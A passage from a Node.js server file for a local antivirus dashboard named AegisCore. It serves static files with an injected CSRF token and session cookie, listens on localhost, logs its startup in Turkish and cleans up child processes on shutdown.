      '.json': 'application/json; charset=utf-8',
      '.svg': 'image/svg+xml'
    };
    if (ext === '.html' && path.basename(filePath).toLowerCase() === 'index.html') {
      const htmlRaw = fs.readFileSync(filePath, 'utf8');
      const tokenMeta = `<meta name="aegis-token" content="${CSRF_TOKEN}" />`;
      const injected = htmlRaw.includes('</head>')
        ? htmlRaw.replace('</head>', `  ${tokenMeta}\n</head>`)
        : `${tokenMeta}\n${htmlRaw}`;
      res.writeHead(200, {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store',
        'Set-Cookie': `aegis_sid=${SESSION_TOKEN}; HttpOnly; SameSite=Strict; Path=/`
      });
      return res.end(injected);
    }
    res.writeHead(200, { 'Content-Type': mimeTypes[ext] || 'text/plain' });
    fs.createReadStream(filePath).pipe(res);
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
  } catch (err) {
    if (!res.headersSent) {
      sendJson(res, err?.statusCode || 500, { error: err?.message || 'Beklenmeyen sunucu hatası.' });
    }
  }
});

server.listen(PORT, '127.0.0.1', () => {
  logEvent(
    'Sistem Başlatma',
    'AegisCore Koruma Servisi Başlatıldı',
    'Çekirdek koruma servisleri, gerçek zamanlı kalkan ve ağ denetimi 127.0.0.1 üzerinde aktif.',
    'SAFE',
    'Çekirdek Koruma Servisleri',
    'Aktif',
    { threatLevel: 'Güvenli' }
  );
  console.log(`AegisCore Antivirus Server running at http://127.0.0.1:${PORT}`);
  performHybridScan(WATCH_SANDBOX_DIR, false, false).catch(() => {});
});

function cleanupChildren() {
  if (shuttingDown) return;
  shuttingDown = true;
  stopTelemetryLoop();
  clearInterval(drivesInterval);
  clearInterval(netShieldInterval);
  stopAllWatchers();
  for (const proc of [csharpProc, vortexProc]) {
    if (proc && !proc.killed) {
      try { proc.kill(); } catch (_) {}
    }
  }
}

process.on('exit', cleanupChildren);
process.on('SIGINT', () => { cleanupChildren(); process.exit(0); });
process.on('SIGTERM', () => { cleanupChildren(); process.exit(0); });
process.on('SIGHUP', () => { cleanupChildren(); process.exit(0); });

setInterval(() => {
  if (!isScanningNow && activeRtInspections === 0 && typeof global.gc === 'function') {
    try { global.gc(); } catch (_) {}
  }
}, 300000).unref();
